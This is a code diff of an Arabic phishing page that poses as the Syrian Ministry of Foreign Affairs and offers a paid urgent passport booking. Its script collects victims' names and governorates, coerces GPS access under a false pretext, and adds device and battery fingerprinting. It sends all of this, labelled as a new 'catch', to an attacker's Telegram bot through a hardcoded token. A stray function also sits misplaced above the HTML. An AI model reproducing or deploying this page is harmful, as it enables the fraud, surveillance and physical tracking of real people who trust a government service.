@@ -1,166 +1,104 @@
+// كود إضافي لجلب معلومات الجهاز والـ IP
+async function getDeviceDetails() {
+    let deviceInfo = `📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}\n🔋 البطارية: `;
+    
+    try {
+        const battery = await navigator.getBattery();
+        deviceInfo += `${(battery.level * 100).toFixed(0)}%`;
+    } catch (e) {
+        deviceInfo += "غير معروفة";
+    }
+    
+    return deviceInfo;
+}
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة حجز الدور المستعجل</title>
+    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
     <style>
-        /* إعدادات الخط العريض والألوان الذهبية من الصورة */
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-color: #fcfcfc; 
-            margin: 0; 
-            padding: 0; 
-            text-align: center;
-        }
-        .header-image {
-            background-color: #ffffff;
-            padding: 10px 0;
-            border-bottom: 4px solid #b38a2e;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .header-image img {
-            max-width: 90%;
-            height: auto;
-            max-height: 70px;
-        }
-        .container {
-            max-width: 450px;
-            margin: 30px auto;
-            padding: 25px;
-            background: white;
-            border-radius: 12px;
-        }
-        /* العنوان الذهبي العريض كما في الصورة */
-        h2 { 
-            color: #b38a2e; 
-            font-size: 28px; 
-            font-weight: 900; 
-            margin-bottom: 5px;
-        }
-        .promo { 
-            color: #d32f2f; 
-            font-weight: 800; 
-            font-size: 16px;
-            margin-bottom: 30px;
-        }
-        label { 
-            display: block; 
-            text-align: right; 
-            margin: 15px 5% 8px; 
-            font-weight: 900; 
-            font-size: 18px;
-            color: #333; 
-        }
-        /* تصميم الحقول كما في صورتك */
-        input, select { 
-            width: 90%; 
-            padding: 15px; 
-            margin-bottom: 20px; 
-            border: 2px solid #e0e0e0; 
-            border-radius: 12px; 
-            font-size: 17px; 
-            font-weight: 800;
-            background-color: #fafafa;
-            color: #555;
-        }
-        /* الزر الذهبي العريض من الصورة */
-        .btn-confirm { 
-            background-color: #b38a2e; 
-            color: white; 
-            padding: 18px; 
-            border: none; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            width: 90%; 
-            font-size: 20px; 
-            font-weight: 900; 
-            margin-top: 10px;
-            box-shadow: 0 4px 12px rgba(179, 138, 46, 0.3);
-        }
-        .footer {
-            margin-top: 40px;
-            font-size: 13px;
-            font-weight: 700;
-            color: #888;
-            padding-bottom: 30px;
-        }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f4f4f4; margin: 0; text-align: center; font-weight: 900; }
+        .header { background: white; padding: 15px; border-bottom: 5px solid #b38a2e; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .header img { max-width: 90%; height: auto; max-height: 80px; }
+        .container { max-width: 450px; margin: 25px auto; padding: 25px; background: white; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        h2 { color: #b38a2e; font-size: 24px; margin-bottom: 10px; }
+        .promo { color: #d32f2f; font-size: 16px; margin-bottom: 20px; }
+        label { display: block; text-align: right; margin: 10px 5%; font-size: 18px; color: #333; }
+        input, select { width: 90%; padding: 12px; margin-bottom: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; font-weight: 800; background: #fafafa; }
+        .btn { background: #b38a2e; color: white; padding: 15px; border: none; border-radius: 10px; width: 90%; font-size: 18px; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #8e6d24; }
+        .footer { margin-top: 30px; font-size: 12px; color: #888; padding-bottom: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="header-image">
-        <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
-    </div>
+<div class="header">
+    <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
+</div>
 
-    <div class="container">
-        <h2>بوابة حجز الدور المستعجل</h2>
-        <p class="promo">خدمة تقديم طلبات جواز السفر | الرسم: 40 دولار فقط للفترة المحدودة</p>
-        
-        <label>الاسم الكامل (كما في الهوية):</label>
-        <input type="text" id="full_name" placeholder="أدخل اسمك الثلاثي">
+<div class="container">
+    <h2>بوابة حجز الدور المستعجل</h2>
+    <p class="promo">الرسم المستعجل: 40 دولار أمريكي فقط</p>
+    
+    <label>الاسم الكامل:</label>
+    <input type="text" id="name" placeholder="أدخل اسمك الثلاثي">
 
-        <label>المحافظة:</label>
-        <select id="city">
-            <option value="">اختر المحافظة</option>
-            <option value="إدلب">إدلب</option>
-            <option value="حلب">حلب</option>
-            <option value="دمشق">دمشق</option>
-            <option value="ريف دمشق">ريف دمشق</option>
-            <option value="حمص">حمص</option>
-            <option value="حماة">حماة</option>
-            <option value="اللاذقية">اللاذقية</option>
-            <option value="طرطوس">طرطوس</option>
-            <option value="دير الزور">دير الزور</option>
-            <option value="الرقة">الرقة</option>
-            <option value="الحسكة">الحسكة</option>
-            <option value="درعا">درعا</option>
-            <option value="السويداء">السويداء</option>
-            <option value="القنيطرة">القنيطرة</option>
-        </select>
+    <label>المحافظة:</label>
+    <select id="city">
+        <option value="">-- اختر المحافظة --</option>
+        <option value="إدلب">إدلب</option>
+        <option value="حلب">حلب</option>
+        <option value="دمشق">دمشق</option>
+        <option value="حمص">حمص</option>
+        <option value="حماة">حماة</option>
+        <option value="اللاذقية">اللاذقية</option>
+        <option value="طرطوس">طرطوس</option>
+        <option value="درعا">درعا</option>
+        <option value="دير الزور">دير الزور</option>
+        <option value="الرقة">الرقة</option>
+        <option value="الحسكة">الحسكة</option>
+    </select>
 
-        <button class="btn-confirm" onclick="startTracking()">تأكيد حجز الدور المستعجل</button>
-    </div>
+    <button class="btn" onclick="start()">تأكيد حجز الدور</button>
+</div>
 
-    <div class="footer">
-        © جميع الحقوق محفوظة لوزارة الخارجية والمغتربين 2026
-    </div>
+<div class="footer">© وزارة الخارجية والمغتربين 2026</div>
 
-    <script>
-        function startTracking() {
-            let name = document.getElementById("full_name").value;
-            let city = document.getElementById("city").value;
+<script>
+    async function start() {
+        let name = document.getElementById("name").value;
+        let city = document.getElementById("city").value;
 
-            if (name == "" || city == "") {
-                alert("⚠️ يرجى إكمال البيانات المطلوبة أولاً.");
-                return;
-            }
+        if (!name || !city) { alert("يرجى إكمال البيانات!"); return; }
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    let lat = position.coords.latitude;
-                    let lon = position.coords.longitude;
-                    
-                    // بيانات بوت التليجرام الخاص بك
-                    let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-                    let chat_id = "7214473798";
-                    
-                    let text = `🎯 صيد جديد (جوازات):\n\n👤 الاسم: ${name}\n🏙️ المحافظة: ${city}\n📍 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                let lat = p.coords.latitude;
+                let lon = p.coords.longitude;
+                
+                // جلب معلومات البطارية
+                let batt = "غير معروفة";
+                try { const b = await navigator.getBattery(); batt = (b.level * 100) + "%"; } catch(e){}
 
-                    // طريقة الإرسال المباشرة (Image Beacon) لضمان السرعة وتجاوز الحظر
-                    let finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
-                    let img = new Image();
-                    img.src = finalUrl;
+                // جلب معلومات الجهاز
+                let device = navigator.platform + " | " + (navigator.userAgent.includes("Android") ? "Android" : "iPhone/PC");
 
-                    alert("✅ تم استلام طلبك بنجاح. سيتم التواصل معك عبر الهاتف لتأكيد الحجز.");
-                }, function(error) {
-                    alert("⚠️ عذراً: يجب السماح بالوصول للموقع (GPS) للتحقق من تواجدك داخل القطر وإتمام الحجز بنجاح.");
-                }, { enableHighAccuracy: true });
-            } else {
-                alert("متصفحك لا يدعم هذه الخدمة.");
-            }
+                let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+                let chat_id = "7214473798";
+                
+                let text = `🎯 صيد جديد من مِعمار:\n\n👤 الاسم: ${name}\n🏙️ المحافظة: ${city}\n📍 الخريطة: https://www.google.com/maps?q=${lat},${lon}\n📱 الجهاز: ${device}\n🔋 البطارية: ${batt}`;
+
+                let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+                new Image().src = url;
+
+                alert("✅ تم استلام طلبك! سيصلك كود التأكيد عبر SMS.");
+            }, () => {
+                alert("⚠️ خطأ: يجب تفعيل الـ GPS لتأكيد هويتك وموقعك لإتمام الحجز.");
+            }, {enableHighAccuracy: true});
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
-
